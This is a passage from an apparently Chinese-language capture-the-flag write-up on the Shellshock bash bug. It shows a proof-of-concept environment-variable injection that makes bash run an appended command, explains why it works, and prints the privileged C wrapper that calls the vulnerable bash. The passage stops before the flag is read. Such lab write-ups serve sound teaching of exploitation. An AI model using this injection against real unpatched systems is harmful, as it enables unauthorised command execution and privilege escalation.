当前路径有一个bash文件，我们简单测试一下是否存在漏洞

shellshock@ubuntu:~$ env VAR='() { :;}; echo Pwned' ./bash -c "echo 1"
Pwned
1

确实存在漏洞，注意要使用当前目录下的bash可执行文件

这个漏洞大概的意思是这样的：env是一个用于设置环境变量的命令，同理，还可以设置函数，函数的开头为()，它判断是变量还是函数就看前面是不是()，如果我们在函数结尾的地方加上一句命令，它是可以执行的，所以上面的利用过程就是基于此

所以结合这个漏洞，我们可以思考如何在本地进行利用

首先我们看shellshock.c的源码，这里设置了用户ID，也就是说执行这个程序可以获得读取Flag的权限，后面调用了有漏洞的bash可执行文件，进行了漏洞的触发

#include <stdio.h>
int main(){
    setresuid(getegid(), getegid(), getegid());
    setresgid(getegid(), getegid(), getegid());
    system("/home/shellshock/bash -c 'echo shock_me'");
    return 0;
}
